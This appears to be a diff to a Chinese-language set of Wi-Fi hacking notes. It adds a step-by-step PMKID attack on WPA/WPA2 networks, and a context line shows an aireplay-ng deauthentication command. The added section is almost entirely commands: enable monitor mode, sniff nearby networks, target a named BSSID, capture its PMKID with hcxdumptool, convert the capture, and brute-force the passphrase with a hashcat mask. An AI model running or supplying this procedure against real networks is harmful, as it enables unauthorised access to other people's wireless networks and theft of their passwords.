@@ -105,6 +105,46 @@ aireplay-ng -0 30 -a BC:F6:85:BF:4F:70 wlan0mon
   * []()
 
 
+#### 获取 PMKID ，而不需要像老的方法（截获4次握手包）
+
+* 参考
+  * [How To Capture WPA/WPA2 PMKID Kali Linux 2018.4](https://online-it.nu/how-to-attack-wpa-wpa2-pmkid-kali-linux-2018-4/)
+
+
+~~~
+# 安装工具
+apt install -y hcxdumptool hcxtools hashcat
+
+# wlan0 进入 monitor 模式
+airmon-ng check kill
+airmon-ng start wlan0mon
+
+# Kill the wpa_supplicant for wlan0
+wpa_cli terminate wlan0
+
+# Use Airodump-ng to sniff nearby networks
+airodump-ng --ivs wlan0
+
+# 嗅探到的目标BSSID加入到filter.txt 中
+## Create the filtermode file and enter the targets BSSID 
+## Target BSSID 84:C9:B2:6A:9E:90 ESSID HonnyP01 Chanel 1
+## "echo "BSSID">filter.txt"
+sudo echo "84C9B26A9E90">filter.txt
+
+# 运行 Hcxdumptool 获取目标的 PMKID，至少运行10分钟
+# If an AP receives the association request packet and supports sending PMKID you will see a message “FOUND PMKID”
+hcxdumptool -o cap01.pcapng -i wlan0 --filterlist=filter.txt --filtermode=2 --enable_status=1 -c 1
+
+# 使用 hcxpcaptool 将 pcapng 文件转换供 hashcat 随后处理
+hcxpcaptool -E essidlist -I identitylist -U usernamelist -z cap01.16800 cap01.pcapng
+
+# Crack the formated pcapng with hashcat
+./hashcat -m 16800 cap01.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
+~~~
+
+
+
+
 #### 截获登录wifi的4次握手包信息(.cap文件）
 
 ~~~
